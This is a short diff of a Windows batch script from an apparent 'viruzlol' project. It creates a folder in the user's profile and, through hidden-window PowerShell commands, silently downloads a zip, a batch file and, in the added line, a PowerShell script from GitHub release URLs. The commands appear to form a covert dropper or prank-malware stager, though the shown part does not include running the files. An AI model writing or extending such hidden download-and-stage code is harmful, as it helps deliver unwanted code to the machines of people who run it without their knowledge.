@@ -37,6 +37,7 @@ IF NOT EXIST "%USERPROFILE%\beanslmao\" mkdir "%USERPROFILE%\beanslmao\"
 rem timeout 1 > NUL
 powershell -windowstyle hidden -command Invoke-WebRequest https://github.com/MEMESCOEP/viruzlol/releases/download/lol/lol.zip -OutFile %USERPROFILE%\beanslmao\package.zip
 powershell -windowstyle hidden -command Invoke-WebRequest https://github.com/MEMESCOEP/viruzlol/releases/download/lol/soundz.bat -OutFile %USERPROFILE%\beanslmao\soundz.bat
+powershell -windowstyle hidden -command Invoke-WebRequest https://github.com/MEMESCOEP/viruzlol/releases/download/lol/timelol.ps1 -OutFile %USERPROFILE%\beanslmao\timelol.ps1
 
 rem powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/xxxMEMESCOEPxxx/viruzlol/releases/download/lol/lol.zip', '%TEMP%\beanslmao\package.zip')"
 
